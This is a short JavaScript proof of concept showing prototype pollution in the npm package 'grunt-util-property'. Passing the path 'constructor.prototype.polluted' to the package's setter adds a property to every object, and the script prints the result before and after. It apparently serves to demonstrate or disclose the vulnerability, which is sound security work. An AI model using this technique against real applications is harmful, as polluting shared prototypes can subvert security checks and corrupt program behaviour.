var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const grunt = require('grunt');
const a = require('grunt-util-property');
console.log({}.polluted);
let b = a(grunt);
b.call(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);